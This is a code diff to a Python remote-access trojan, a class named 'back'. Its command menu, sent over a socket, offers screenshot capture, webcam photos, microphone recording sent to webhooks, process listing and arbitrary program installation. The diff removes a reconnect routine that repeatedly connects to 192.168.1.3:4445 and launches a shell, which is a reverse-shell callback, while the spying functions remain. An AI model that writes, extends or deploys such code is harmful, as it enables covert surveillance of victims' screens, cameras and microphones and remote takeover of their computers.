@@ -28,12 +28,11 @@ class back:
     def help_desk(self):
         self.help_ = ("===========================================================\n"+
                     "|| 1.) bye              -- To close the session             ||\n"+
-                    "|| 2.) reconn           -- To reconnect to the SS server.   ||\n"+
-                    "|| 3.) screen -webhook  -- To take screenshot.              ||\n"+
-                    "|| 4.) cam -webhook     -- To take webcam photo.            ||\n"+
-                    "|| 5.) record t c web   -- To record sound from Mic.        ||\n"+
-                    "|| 6.) list -id         -- To list the process id.          ||\n"+
-                    "|| 7.) install          -- To install any program.          ||\n"
+                    "|| 2.) screen -webhook  -- To take screenshot.              ||\n"+
+                    "|| 3.) cam -webhook     -- To take webcam photo.            ||\n"+
+                    "|| 4.) record t c web   -- To record sound from Mic.        ||\n"+
+                    "|| 5.) list -id         -- To list the process id.          ||\n"+
+                    "|| 6.) install          -- To install any program.          ||\n"
                     "===========================================================\n")
         s.send(self.help_.encode())
 
@@ -127,9 +126,6 @@ class back:
                 c = ai.split(" ")
                 self.record_sound(c[0], c[1], c[2], c[3])
 
-            elif (cmd[:6] == "reconn"):
-                self.reconnect()
-
             elif (cmd[:4] == "help"):
                 self.help_desk()
 
@@ -152,16 +148,6 @@ class back:
         file_name = url.split("/")[-1]
         with open(file_name, "wb") as file:
             file.write(get.content)
-
-    def reconnect(self):
-        while True:
-            time.sleep(10)
-            try:
-                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-                s.connect(("192.168.1.3", 4445))
-                self.shell()
-            except:
-                pass
 
     def main(self):
         while True:
